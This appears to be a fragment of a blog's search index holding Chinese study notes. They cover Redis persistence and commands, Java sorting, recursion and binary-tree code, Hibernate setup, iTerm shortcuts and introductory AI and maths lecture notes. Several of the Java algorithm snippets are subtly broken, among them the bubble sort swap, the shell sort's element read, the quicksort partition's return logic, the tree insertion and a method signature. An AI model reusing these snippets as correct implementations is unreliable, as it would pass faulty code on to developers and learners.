在某个条件番组后触发，一次性快照（snapshot）。将所有数据写入一个临时文件，持久化结束后，用这个临时文件替换上次持久化的文件，达到数据恢复。 snapshot触发的时机，是有“间隔时间”和“变更次数”共同决定，同时符合2个条件才会触发snapshot，否则“变更次数”会被继续累加到下一个“间隔时间”上。 snapshot过程上启动一个独立的子进程完成，故并不阻塞客户端请求。snapshot首先将数据写入临时文件，当成功结束后，将临时文件重命名为dump.rdb rdb优缺点说明： 优点： 文件紧凑 形式简单即单rdb文件 由子进程完全独立搞定对主进程无影响 恢复速度快 缺点： 每次保存都是保存一个完整数据集的操作，持续时间可长可短，对丢失数据控制力不佳 若数据量过大，造成CPU和IO压力大，会影响主线程服务性能 Append-only file（AOF） 将“写操作+数据”以格式化指令的方式追加到操作日志文件的尾部，“日志文件”保存了历史所有的操作过程 当server需要数据恢复时，可以直接replay此日志文件，即可还原所有的操作过程。 由于aof操作是发生在后台异步线程执行，可以采用no文件同步（交给操作系统策略同步），每秒钟fsync同步一次，每个写入发生时fsync同步一次，默认为每秒同步一次。 aof也不是绝对无数据丢失的：aof是写入内存cache，由后台线程按照aof策略执行fsync，极端情况下依然会丢失相应的数据 aof优缺点说明： 优点： 数据持久化更及时，效果更好 尾部追加方式，且为后台线程执行，效果很高，亦不影响主线程服务性能 自动进行aof日志重写和替换，达到适时瘦身的效果 日志文件为文本形式，易读易维护易修复 缺点： aof日志文件体积一般比rdb方式要大 在数据恢复时，aof的恢复速度一般是慢于rdb 4.redis常用命令 redis设置密码 在redis.conf中，修改requirepass参数 requirepass xxxxxx 重新启动redis-server ./redis-server ../redis.conf 客户端带密码连接 ./redis-cli -a xxxxxx 客户端先进入后命令验证 ./redis-cli auth xxxxxx key常用命令：（第11集） set key value get key del key dump key //返回key对应的序列化后的值 keys pattern //常用的是keys * exists key expire key seconds //给指定key设置失效时间 expireat key timestamp //以截止时间为失效时间段(时间戳/s) ttl key //返回剩余存活时间,-1为永久,-2为没有 randomkey rename key newkey renamenx key newkey //当newkey不存在时，将key改为newkey type key 5.hashmap常用命令 hset map1 k1 v1 hsetnx key field value hvals key //获取其所有的key值 hexists key field hget key value hgetall key hkeys key hlen key //取得所有的键值 hmget key field1 [field2]... hmset key field1 value1 [field2 value2] 6.list常用命令以及生产者消费者模式的实现 lpush lpushx lrange key index_start index_stop //获取指定范围的value rpop key //移除并获取列表中最后一个参数 rpush rpushx llen key lpop key //移除并获取列表中第一个参数 //这里用下面两个参数来实现生产者消费者。 //多开几个redis来模拟生产者消费者的意思,即1个先长时间阻塞住，另外几个来往里面生产 blpop key1 [key2] timeout //移出并获取列表的第一个数,如果没有值取则阻塞timeout秒 brpop key1 [key2] timeout 7.set和zset set主要存储的是String类型. hash表实现 sadd key member1 [member2] srem key member1 [member2] //删除 sismember key member //判断key在set里面是否存在 smembers key //返回所有成员 smove A B member spop key sunion key1 [key2] //返回指定所有集合的并集 sunionstore C key1 [key2] //并集后存储到C集合 sinter key1 [key2] scard key //获取集合成员数 sdiffstore C key1 [key2] //差集，存到C sinterstore C key1 [key2] zset（SortedSet）有序集合 跟set比多了一个double的分数参数,从小到大排序 zadd key score value zcard key zcount key min max //计算有序集合中指定区间分数的成员数 zincrby key increment member //对指定成员的分数加上增量increment zinterstore C numbkeys key[key...] //交集，C zlexcount key min max //计算指定字典区间内成员数 (- + 指全部； [:指定特定值) zrange key start stop //通过索引区间返回有序集合内指定区间内成员 zrangebylex key min max //通过字典区间返回成员 zrank key member //返回指定成员的索引 zrem zscore key member //返回有序集中成员的分数值 ... 8.使用HyperLogLog结构做高效基数统计 基数这里就是去重的意思 1.硬统计-hashset （1000万个） 2.bitset：位图：-bloomfilter 3.概率统计基数：极小的空间，通过概率方式求出巨大数量的一个基数结果，reg：几十亿。但是不够精准。 在1%标准误差范围内，可以用该结构。 优点：输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的，且很小的。每个HyperLogLog键只需要12KB内存，即可计算近2^64个不同元素的基数。且其所占存储空间并不是线性增长的。 只计算基数，并不存储数据本身，故不能查看元素。 pfadd hyper1 v1 v2 v3 pfcount hyper1 (reg:统计网站的UV信息等) redis事务 可以理解为批量执行单条命令。而且中间不会被其它事物打断。 multi set k1 v1 set k2 v2 set k2 v3 exec (上面命令批量执行) multi set k1 v1 discard //取消事务，取消set k1 v1 这个块的命令 redis连接服务器操作 echo &quot;123&quot; ping 127.0.0.1 //PONG代表OK quit select index //切换到指定的数据库，默认有16个数据库，默认选择索引为0的数据库 bgrewriteaof ... dbsize flushall 清空所有数据库key flushdb 清空当前数据库key lastsave monitor 调试时用,监控 save shudown slaveof host port 将当前服务器变为指定服务器的从属服务器 slaveof 127.0.0.1 6379 -a tianliangedu java操作redis ·java操作redis的第三方库jedis com.utils public class RedisUtil{ main(){ //连接本地的Redis服务 Jedis jedis = new Jedis(&quot;localhost&quot;,6379); jedis.auth(&quot;tianliangedu&quot;); //查看服务是否运行 sout(&quot;服务正在运行：&quot; + jedis.ping()); //添加kv jedis.set(&quot;jedis_k1&quot;,&quot;jedis_v1&quot;); sout(jedis.get(&quot;jedis_k1&quot;)); //添加集合 jedis.hset(&quot;set1&quot;,&quot;set_k1&quot;,&quot;set_v1&quot;); sout(jedis.hget(&quot;set1&quot;,&quot;set_k1&quot;)); } } 6.redis使用场景 ·加速数据库访问 ·缓存一些静态数据 (不需要去mysql数据库里查) ·缓存一些不经常变化数据 ·缓存一些高耗时计算的数据 ·缓存一些预计算的数据 ·充当中间件，做系统模块或子系统之间的解耦使用。(可以不用http通信)]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>数据库</category>
        <category>Redis</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习笔记01--Java实现]]></title>
    <url>%2F2018%2F09%2F10%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-Java%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[java算法 最炫小小生；Java数据结构与算法[20讲] note01 数组 note02 1.简单排序 1.1冒泡排序 1.2选择排序 1.3插入排序 1.1冒泡 //从小到大 int tmp=0; for(int i=0;i&lt;arr.length-1;i++){ for(int j=arr.length-1;j&gt;i;j--){ if(arr[j]&lt;arr[j-1]){ tmp = arr[j]; arr[j] = arr[j-1]; arr[j] = tmp; } } } 1.2选择排序 int k=0; long tmp=0; for(int i=0;i&lt;arr.length-1;i++){ k=i; for(int j=i;j&lt;arr.length;j++){ if(arr[j]&lt;arr[k]){ k=j; } } tmp=arr[i]; arr[i]=arr[k]; arr[k]=tmp; } 1.3插入排序 long tmp=0; for(int i=1;i&lt;arr.length;i++){ tmp=arr[i]; int j=i; while(j&gt;0 &amp;&amp; arr[j]&gt;=tmp){ arr[j]=arr[j-1]; j--; } arr[j]=tmp; } note03 栈和列队 //列队类，先进先出 public class MyQueue{} note04 链表 /* * 链节点，相当于是车厢 */ public class Node{ //数据域 public long data; //指针域 public Node next; public Node(long value){ this.data = value; } //显示方法 public void display(){ sout(data + &quot; &quot;); } } /* * 链表，相当于火车 */ public class LinkList{ //头结点 private Node first; public LinkList(){ first = null; } ... } note05 双端链表 note06 递归 分递和归，递归的return返回到开头 三角数字：1 3 6 10 15 21。。。 public static void getNumber(int){ int total = 0; while(n &gt; 0){ total = total + n; n --; } return total; } public static int getNumberByRecursion(int n){ if(n == 1){ return 1; }else{ return n + getNumberByRecursion(n - 1); } }//两者结果相同 Fibonacci public static int getNumber(int n){ if(n == 1){ return 0; }else if(n == 2){ return 1; }else{ return getNumber(n - 1)+ getNumber(n - 2); } } note07 递归的高级应用 汉诺塔 public class HanoiTower{ /* * 移动盘子 * topN:移动的盘子数 * from:起始塔座 * inter:中间塔座 * to:目标塔座 */ public static void doTower(int topN,char from,char inter,char to){ if(topN == 1){ sout(&quot;盘子1，从&quot;+ from + &quot;塔座到&quot; + to + &quot;塔座&quot;); }else{ doTower(topN -1 , from , to, inter); sout(&quot;盘子&quot; + tonN + &quot;，从&quot;+ from + &quot;塔座到&quot; + to + &quot;塔座&quot;); doTower(topN -1, inter, from, to); } } } note08 希尔排序 基于插入排序 插入排序的缺陷，多次移动： 假如一个很小的数据在靠右端的位置上，那么要将该数据排序到正确的位置上，则所有的中间数据都需要向右移动一位 优点： 希尔排序通过加大插入排序中元素之间的间隔，并对这些间隔的元素进行插入排序，从而使得数据可以大幅度的移动。当完成该间隔的排序后，希尔排序会减少数据的间隔再进行排序。 间隔的计算： 间隔h的初始值为1，通过h=3*h+1来计算循环，直到该间隔大于数组的大小时停止。最大间隔为不大于数组大小的最大值。 间隔的减少： 可以通过公式h=(h-1)/3来计算 public class Shellsort{ public static void sort(long[] arr){ //初始化一个间隔 int h = 1; //计算最大间隔 while(h &lt; arr.length / 3){ h = h * 3 + 1; } while(h &gt; 0){ //进行插入排序 long tmp = 0; for (int i = h; i &lt; arr.length; i ++){ tmp = arr[h]; int j = i; while(j &gt; h - 1 &amp;&amp; arr[j - h] &gt;= tmp){ arr[j] = arr[j - h]; j -= h; } arr[j] = tmp; } //减小间隔 h = (h - 1) / 3; } } } note09 快速排序 通常将一个数组划分成两个子数组，然后递归调用自身为每个子数组进行快排 一般将数组最右端的数据为关键字 //划分数组 public static int partition(long arr[],int left,int right,long point){ int leftPtr = left - 1; int rightPtr = right;//因为从最右端前一个位置循环的，所以不用+1 while(true){ //循环,将比关键字大的留在左端 while(leftPtr &lt; rightPtr &amp;&amp; arr[++leftPtr] &lt; point); //循环，将比关键字大的留在右端 while(rightPtr &gt; leftPtr &amp;&amp; arr[--rightPtr] &gt; point); if(leftPtr &gt;= rightPtr){ break; }else{ long tmp = arr[leftPtr]; arr[leftPtr] = arr[rightPtr]; arr[rightPtr] = tmp; return leftPtr; } } //将关键字和当前leftPtr所指的这一个进行交换 long tmp = arr[leftPtr]; arr[leftPtr] = arr[right]; arr[right] = tmp; } public static void sort(long[] arr, int left, int right){ if(right - left &lt;= 0){ return; }else{ //设置关键字 long point = arr[right]; //获得切入点，同时对数组进行划分 int partition = partition(arr,left,right,point); //对左边的子数组进行快速排序 sort(arr,left,partition-1); //对右边的子数组进行快速排序 sort(arr,partition + 1, right); } } note11 二叉树的基本操作 1.插入节点 从根节点开始查找一个相应的节点，这个节点将成为新插入节点的父节点。当父节点找到后，通过判断新节点的值比父节点的值大小来决定是连接到左子节点还是右子节点 2.查找节点 从根节点开始查找，如果查找的节点值比当前节点的值小，则继续查找其左子树，否则查找其右子树。 //二叉树类 public class Tree{ //根节点 public Node root; //插入节点 public void insert(long value){ //封装节点 Node newNode = new Node(value); //引用当前节点 Node current = root; //引用父节点 Node parent; //如果root为null，也就是第一插入的时候 if(root == null){ root = newNode;//这里把第一次插入当成了root return; }else{ //父节点指向当前节点 parent = current; //如果当前指向的节点数据比插入的要大，则向左走 if(current.data &gt; value){ current = current.leftChild; if(current == null){ parent.leftChild = newNode; return; } }else { current = current.rightChild; if(current == null){ parent.rightChild = newNode; return; } } } } //查找节点 public Node find(long value){ //引用当前节点，从根节点开始 Node current = root; //循环，只要查找值不等于当前节点的数据项 while(current.data != value){ //进行比较，比较查找值和当前节点的大小 if(current.data &gt; value){ current = current.leftChild; }else{ current = current.rightChild; } if(current == null){ return null; } } return current; } } //二叉树节点 public class Node{ //数据项 public long data; //数据项 public String sData; //左子节点 public Node leftChild; //右子节点 public Node rightChild; //构造方法 public Node(long data,String sData){ this.data = data; this.sData = sData; } } note12 遍历二叉树 遍历树 前序遍历 1.访问根节点 2.前序遍历左子树 3.前序遍历右子树 中序遍历 1.中序遍历左子树 2.访问根节点 3.中序遍历右子树 后序遍历 1.后序遍历左子树 2.后序遍历右子树 3.访问根节点 //二叉树类 public class Tree{ //前序遍历 public void frontOrder(Node localNode){ if(localNode != null){ //访问根节点 sout(localNode.data + &quot;,&quot; + localNode.sData); //前序遍历左子树 frontOrder(localNode.leftChild); //前序遍历右子树 frontOrder(localNode.rightChild); } } //中序遍历 public void inOrder(Node localNode){ if(localNode != null){ //中序遍历左子树 inOrder(localNode.leftChild); //访问根节点 sout(localNode.data + &quot;, &quot; + localNode.sData); //中序遍历右子树 inOrder(localNode.rightChild); } } //后序遍历 public void afterOrder(Node localNode){ if(localNode != null){ //后序遍历左子树 afterOrder(localNode.leftChild); //后序遍历左子树 afterOrder(localNode.rightChild); //访问根节点 sout(localNode.data + &quot;, &quot; + localNode.sData); } } } note13 删除二叉树节点 删除节点是二叉树操作中最复杂的。在删除之前首先要查找药删的节点。找到节点后，这个要删除的节点可能会有三种情况需要考虑。 1.该节点是叶子节点，没有子节点 要删除叶节点，只需要改变该节点的父节点的引用值，将指向该节点的引用设置为null就可以了 2.该节点有一个子节点 改变父节点的引用，将其直接指向要删除节点的子节点 3.该节点有两个子节点 要删除有两个子节点的节点，就需要使用它的中序后继来替代该节点 //第13讲 02:00]]></content>
      <categories>
        <category>技能</category>
        <category>数学</category>
        <category>算法/分析</category>
        <category>Java实现</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hibernate学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2FHibernate%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[Hibernate学习 //note_day01 CRM //其实白话就是对客户进行交互的系统 客户信息管理 联系人管理 客户拜访管理 综合查询 统计分析 系统管理 框架：指的是软件的半成品，已经完成了部分功能 EE三层架构：MVC 解决方案： 客户端层 Html,CSS,JS替代了JavaApplet web层 Servlet、JSP 业务逻辑层 EJB 持久层 SSH（Struts+Spring+Hibernate） SSM（SpringMVC+Spring+Mybatis） web层 业务层 持久层 Servlet,JSP JavaBean JDBC Struts2 Spring Hibernate SpringMVC MyBatis Hibernate(开放源代码的对象关系映射框架) ORM框架 自动生成SQL语句 ORM：（对象关系映射） 指的是将一个java中的对象域关系型数据库中的表建立一种映射关系，从而操作对象就可以操作数据库中的表 对象和一个表建立映射关系 Java:Object MySql:Relational User{ create table user{ String name; name varchar(20), String pwd; pwd varchar(20) } } -&gt; UserDao{ public void save(User user){ session.save(user); } } 通过配置（XML）来实现的 下载Hibernate5 documentation :Hibernate开发文档 lib :Hibernate开发包 optional :可选的jar包 required :Hibernate开发的必须的依赖包 project :Hibernate提供的项目(里面有例子) 引入的jar包： ·数据库驱动包 ·Hibernate开发的必须的jar包 ·Hibernate日志的包 new-&gt;Java project -&gt; com.ithima.hibernate.demo1 Customer.java //客户管理的实体类 创建SQL表-&gt; 创建实体类 //客户管理的实体类 public class Customer{ private Long cust_id; private String cust_name; ... } -&gt;创建映射 (类名.hbm.xml) new-&gt;XML-&gt;Customer.hdm.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; //映射约束： hibernate-core-5.0.7.Final.jar-&gt;org.hibernate-&gt; hibernate-mapping-3.0.dtd-&gt; 复制约束: &lt;! DOCTYPE hibernate-mapping PUBLIC &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot; &quot;http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd&quot;&gt; &lt;hibernate-mapping&gt;//根标签 &lt;!-- 建立类与表的映射 --&gt; &lt;class name=&quot;com.xxx.Customer&quot; table=&quot;cst_customer&quot;&gt; &lt;!-- name:哪个类；table：哪个表;来建立映射--&gt; &lt;!-- 建立类中的属性与表中的主键对应 --&gt; &lt;id name=&quot;cust_id&quot; column=&quot;cust_id&quot;&gt; &lt;!-- 主键生成策略：一般先用本地策略开发 --&gt; &lt;generator class=&quot;native&quot;/&gt; &lt;/id&gt; &lt;!-- 建立类中的普通的属性和表的字段的对应 --&gt; &lt;!-- 即主键以外的属性 --&gt; &lt;property name=&quot;cust_name&quot; column=&quot;cust_name&quot; type=&quot;string&quot; length=&quot;32&quot; /&gt; &lt;property name=&quot;cust_level&quot; column=&quot;cust_level&quot; /&gt; &lt;property name=&quot;cust_phone&quot; column=&quot;cust_phone&quot; /&gt; &lt;!-- type:java --&gt; &lt;property name=&quot;cust_mobile&quot; column=&quot;cust_mobile&quot; type=&quot;java.lang.String&quot; /&gt; &lt;!-- type:hibernate --&gt; &lt;property name=&quot;cust_mobile&quot; column=&quot;cust_mobile&quot; type=&quot;string&quot; /&gt; &lt;!-- type:数据库类型 --&gt; &lt;property name=&quot;cust_mobile&quot; &gt; &lt;column name=&quot;cust_mobile&quot; sql-type=&quot;varchar&quot;&gt;&lt;/column&gt; &lt;/property&gt; ... &lt;/class&gt; &lt;/hibernate-mapping&gt; 创建一个Hibernate的核心配置文件(指明连哪个数据库) Hibernate的核心配置文件的名称，一般用hibernate.cfg.xml projectname-&gt;src-&gt;new-&gt;hibernate.cfg.xml 约束位置复制： hibernate-core-5.0.7.Final.jar-&gt;org.hibernate-&gt; hibbernate-configuration-3.0.dtd &lt;!DOCTYPE hibernate-configuration PUBLIC &quot;-//Hibernate/Hibernate Configuration DTD 3.0//EN&quot; &quot;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd&quot;&gt; &lt;hibernate-configuration&gt; &lt;session-factory&gt; &lt;!-- 查找位置：hiberante-release-5.0.7.Final/project/etc/hibernate.properties --&gt; &lt;!-- 连接数据库的基本参数 --&gt; &lt;property name=&quot;hibernate.connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/property&gt; &lt;property name=&quot;hibernate.connection.url&quot;&gt;jdbc:mysql://localhost:3306/hibernate_day01&lt;/property&gt; &lt;property name=&quot;hibernate.connection.username&quot;&gt;root&lt;/property&gt; &lt;property name=&quot;hibernate.connection.password&quot;&gt;123&lt;/property&gt; &lt;!-- 配置Hibernate的方言,每种数据库的sql写法不一样需要用方言来指定 --&gt; &lt;property name=&quot;hibernate.dialect&quot;&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt; &lt;!-- 可选配置========= --&gt; &lt;!-- 打印SQL,默认是不打印的 --&gt; &lt;property name=&quot;hibernate.show_sql&quot;&gt;true&lt;/property&gt; &lt;!-- 格式化SQL --&gt; &lt;property name=&quot;hibernate.format_sql&quot;&gt;true&lt;/property&gt; &lt;!-- 自动创建表 --&gt; &lt;property name=&quot;hibernate.hbm2ddl.auto&quot;&gt;update&lt;/property&gt; &lt;!-- 配置C3P0连接池,引C3P0.jar --&gt; ... &lt;!-- 映射文件 --&gt; &lt;mapping resource=&quot;com/xxx/Customer.hbm.xml&quot; /&gt; &lt;/session-factory&gt; &lt;/hibernate-configuration&gt; 测试代码： //Hibernate入门案例 public class HibernateDemo1{ @Test //保存客户的案例 public void demo1(){ //1.加载Hibernate的核心配置文件 Configuration configuration = new Configuration().configure(); //如果将&lt;mapping&gt;这个标签注释掉，则 //可以手动加载映射 //configuration.addResource(&quot;com/xxx/Customer.hbm.xml&quot;); //2.创建一个SessionFactory对象：类似于JDBC中的连接池 SessionFactory seesionFactory = configuration.buildSessionFactory(); //3.通过SessionFactory获取到Session对象：类似于JDBC中的Connection Session session = sessionFactory.openSession(); //4.手动开启事务,后期交给Spring Transaction transaction = session.beginTransaction(); //5.编写代码 Customer customer = new Customer(); customer.setCust_name(&quot;xx&quot;); session.save(customer); //6.事务提交 transaction.commit(); //7.资源释放 session.close(); } } Hibernate的常见配置 1.XML提示的配置 !DOCTYPE里面的 &quot;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd&quot; 在连网时可以有提示 //离线提示配置 Eclipse-&gt;window-&gt;preferences-&gt;XML Catalog-&gt;User Soecified Entries-&gt;Add -&gt;Key type: URI ; Key: &quot;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd&quot; ; Location:需要下载这个dtd Hibernate的映射的配置 Customer.hbm.xml: &lt;class&gt; &lt;标签用来建立类与表的映射关系&gt; name 类的全路径 table 表名(类名与表名一致，table可以省略) catalog 数据库名 &lt;id&gt; &lt;标签用来建立类中的属性与表中的主键的对应关系&gt; name 类中的属性名 column 表中的字段名(类中的属性名和表中的字段名如果一致，column可以省略) length 长度 type 类型 &lt;property&gt; &lt;标签用来建立类中的普通属性与表的字段的对应关系&gt; name 类中的属性名 column 表中的字段名 length 长度 (可以自动建表的时候指定长度) type 类型(有3种写法 )(可以不用写) not-null 设置非空 true/false unique 设置唯一，默认为false Hibernate的核心的配置 第一种方式：属性文件方式 hibernate.properties hibernate.connection.driver_class=com.mysql.jdbc.Driver ... 属性文件的方式不能引入映射文件(需要手动编写代码去加载映射文件) 第二种方式：xml文件方式 hibernate.cfg.xml 必须的配置 连接数据库的基本的参数 驱动类 url路径 用户名 密码 方言 可选配置 显示SQL hibernate.show_sql 格式化SQL hibernate.format_sql 自动建表 hibernate.hbm2ddl.auto none 不使用hibernate的自动建表 create 如果数据库中已经有表，删除原有表，重新创建，如果没有表，新建表。(测试) create-drop 如果数据库中已经有表，删除原有表，执行操作，删除这个表。如果没有表，新建一个，使用完了删除该表(测试) update 如果数据库中有表，使用原有表，如果没有表，创建新表(更新表结构) validate 如果没有表，不会创建表，只会使用数据库中原有的表(校验映射和表结构是否一致) 映射文件的引入 引入映射文件的位置 mapping Hibernate 的核心API Configuration:Hibernate的配置对象 作用： 加载核心配置文件 Hibernate.properties Configuration cfg = new Configuration(); hibernate.cfg.xml Configuration cfg = new Configuration().configure(); 加载映射文件 SessionFactory:Session工厂 sessionFactory内部维护了Hiberante的连接池和二级缓存(不讲)(企业一般都用redis替换掉了)。是线程安全的对象。一个项目只需要创建一个即可 src-&gt;log4j.properties ### direct log messages to stdout ### # 输出源是控制台 log4j.appender.stdout=org.apache.log4j.ConsoleAppender log4j.appender.stdout.Target=System.err log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.layout.ConversionPattern=%d{ABSOLUTE} %5p %c{1}:%L - %m%n ### direct log messages to file mylog.log ### # 输出源是文件 log4j.appender.file=org.apache.log4j.FileAppender log4j.appender.file.File=c\:mylog.log log4j.appender.file.layout=org.apache.log4j.PatternLayout log4j.appender.file.layout.ConversionPattern=%d{ABSOLUTE} %5p %c{1}:%L - %m%n ### set log levels - for more verbose logging change &apos;info&apos; to &apos;debug&apos; ### # error warn info debug trace(堆栈信息) log4j.rootLogger=info, stdout,file (输出级别，输出源) 配置连接池：(了解) 抽取工具类 com.xxx.hibernate.utils HibernateUtils.java (Hibernate工具类) public class Hiberanteutils{ public static final Configuration cfg; public static final SessionFactory sf; static{ cfg = new Configuration().configure(); sf = cfg.buildSessionFactory(); } public static Session openSession(){ return sf.openSession(); } } Session:类似Connection对象是连接对象 (非线程安全) 代表的是Hibernate与数据库的连接对象，与数据库交互桥梁 可以将其定义到内部里面 SessionAPI： 保存方法 Serializable save(Object obj) 查询方法 T get(Class c,Serializable id); (用的多一些) T load(Class c,Serializable id); /* * Customer customer = session.get(Customer.class,11); * //这里已经发送了SQL * sout(customer); * Customer customer = session.load(Customer.clas,21); * sout(customer); * //这里没有发送SQL */ get和load的区别，用debug去看: get： ·采用的是立即加载，执行到这行代码的时候，就会马上发送SQL语句去查询 ·查询后返回的是真实对象本身 ·查询一个找不到的对象的时候，返回null load： ·采用的是延迟加载（lazy懒加载），执行到这行代码的时候，不会发送SQL语句，当真正使用这个对象的时候才会发送SQL语句 ·查询后返回的是代理对象(利用的第三方的javassist-3.18.1-GA.jar来产生的代理对象) ·查询一个找不到的对象的时候，返回ObjectNotFoundException异常 修改方法 void update(Object obj); //直接创建对象，进行修改（不推荐） Customer customer = new Customer(); customer.setCust_id(11); session.update(customer); //先查询，再修改（推荐） Customer customer = session.get(Customer.class,11); customer.setCust_name(&quot;xxx&quot;); session.update(customer); 删除方法 void delete(Object obj); 保存或更新 void saveOrUpdate(Object obj) 查询所有 //接收HQL:Hibernate Query Language Query query = session.createQuery(&quot;from Customer&quot;); List&lt;Customer&gt; customer_list = query.list(); //接收SQL (复杂的时候才用) SQLQuery query = session.createSQLQuery(&quot;select * from cst_customer&quot;); List&lt;Object[]&gt; list = query.list(); Transaction:事务对象 commit() roolback() //note_day02 ORM：对象关系映射 持久化类的编写规则： 持久化：将内存中的一个对象持久化到数据库中过程。 持久化类：一个java对象与数据库的表建立了映射关系，那么这个类在Hiberante中称为是持久化类。 持久化类 = Java类 + 映射文件 对持久化类提供一个无参数的构造方法（因为Hibernate底层用了反射生成实例） 属性需要私有，对私有属性提供public的get和set方法（Hibernate中获取，设置对象的值） 对持久化类提供一个唯一标识OID与数据库主键对应（java中通过对象的地址区分是否是同一个对象，数据库中通过主键确定是否是同一个记录，在Hibernate中通过持久化类的OID的属性区分是否是同一个对象 持久化类中属性尽量使用包装类类型（因为基本数据类型默认是0，那么0就会有很多的歧义。包装类类型默认值是NULL） 持久化类不要使用final进行修饰（跟延迟加载有关系，延迟加载本身是hibernate一个优化手段，返回的是一个代理对象(javassist可以对没有实现接口的类产生代理--使用了非常底层字节码增强技术，继承这个类进行代理).如果不能被继承，则不能产生代理对象，延迟加载也就失效，load方法和get方法也就一致了) 主键生成策略 主键的分类: 自然主键 代理主键 //TODO day02 03 01:27 持久化类的三种状态 Hibernate的一级缓存 Hibernate的其他API]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>框架</category>
        <category>Hibernate</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iTerm--快捷键效率篇01]]></title>
    <url>%2F2018%2F09%2F10%2FiTerm--%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%88%E7%8E%87%E7%AF%8701%2F</url>
    <content type="text"><![CDATA[快捷键及效率工具 iTerm 1.高亮当前鼠标位置： ⌘+/ 当你切了屏幕，找不到当前位置时，也许能帮你省心。 2.切分屏幕：⌘+d 水平切分，⌘+Shift+d 垂直切分； 不多说，谁用谁知道。 3.智能查找，支持正则查找：⌘+f。 4.全屏显示tabs。 Items默认全屏时不显示tabs，这多少有点不方便。 5.切换 tab：⌘+←, ⌘+→, ⌘+{, ⌘+}。⌘+数字直接定位到该 tab； 谁用谁知道，tab随意切。 6.新建tab ⌘+t， 关闭tab ⌘+w 7.广播输入。shell-Boardcast Input 操作为数不多的主机时，可以使用。相当方便。]]></content>
      <categories>
        <category>时间整理</category>
        <category>效率</category>
        <category>Mac</category>
      </categories>
      <tags>
        <tag>效率</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人工智能学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[1.复杂系统 1.1物理预测的胜利与失效 牛顿力学 预测模型 Complexity ruins predictability ):Randomness ):Chaos. 混沌。 三体。 精确小数点位数 ):Reflectivity ):Network Effect ):History Dependency 引论： Complex Theory that predicts when unpredictable happens 群体制约个体 Complex System In Common: Global structure rises from simple Evolved instand of being designed 2 大数据与机器学习 Data grows,but not our insight 3. 人工智能的三个阶段 3.1 规则阶段 3.2 机器学习阶段发展至连接主义阶段 符号，学派，控制 Classic Machine Learning 贝叶斯网络。 决策树. 3.4 连接主义阶段发展至学习阶段 神经网络没有唯一的答案 GPU 特征工程： 将混淆的数据分成可以机器学习能够线性切割的组的工程 r =. x^2 + y^2 𝛼 = y/x 3.3 三个阶段总结分析 Three Generation of AI Rule-based systems Classic machine learning Representation learning 3.6 应用 文本分类 图片抽取 音频 翻译 人工智能艺术家 无人机 医疗 课程大纲： 贝叶斯与随机过程 贝叶斯分析 随机过程理论 监督学习 KNN 线性回归 线性分类 神经网络 支持向量机 决策树 模型选择 扫描各种算法。 数学推导 -- 理解/ 参数 超参。 重点 程序 -- 安装 -- 介绍 深度学习 CNN 卷积网络 -- 对抗学习 RNN 循环网络 公式 稍微理解 理论工具 RRM等 python实践 重点 应用 -- 图像 -- 语言 复杂系统 统计力学（1.5天） 非线性动力学（1.5d） 应用 复杂系统反推机器学习 社会组织结构 计算神经科学 agent base model 应用于市场及分析里 4.高数 4.1 实数的定义（一） 高数 -&gt; 解决连续问题 线代 -&gt; 离散 +概率统计 什么是实数？ 整数 -&gt;有理数：Q P -&gt;实数： 有理数+无理数 戴的金分划：全集分成几个子集 实数的定义： 1.A中存在最大值，B中不存在最小值 2.A中不存在最大值，B中存在最小值 1.2叫做有理分划 3.A中不存在最大值，B中不存在最小值 无理分划 性质： 1）：稠密性 2）：有序性 4.4 实数元素个数 势，集合元素的个数。 等势：A，B集合间元素可一一对应。 希尔伯特旅馆： 可列/可数：（列成一排） 意思是可以像一一对应那样列成实线 4.6 自然数个数少于实数个数 反证法 实数的势&gt;正整数的势 4.8 无穷大之比较： ln n &lt; n ^ 1/a1 &lt; n &lt; n ^ a2 &lt; a3^n &lt; n! &lt; n ^ n n！～= √2𝛑n * (n/e)^n n ~= 10 要小于 1 / 10^6 4.10 级数的收敛 无穷小 无穷大的倒数顺序 发散。 收敛。 1 / n^a1 收敛(a&gt;1) 级数收敛的分界线 ....1/a^n &lt; 1 / n^a1 &lt; 1/n(ln n)^a 分界线 &lt; 1/n(ln n)&lt; 1/n &lt; 1/n^1/a &lt; 1/lna .... a = 1 发散 a &gt; 1 收敛 4.11 极限的定义 ℇ-∂语言 ℇ-N语言 lim(fx) = L x-&gt;x0 ℇ -- 任意目标变量 ∂ -- 自变量与目标变量的差值(????) |x-x0| &lt; ∂ 表示x 与 x0足够近 有|f(x) - L| &lt; ℇ lim Sn = L n-&gt;∞ ℇ,N n&gt; N时 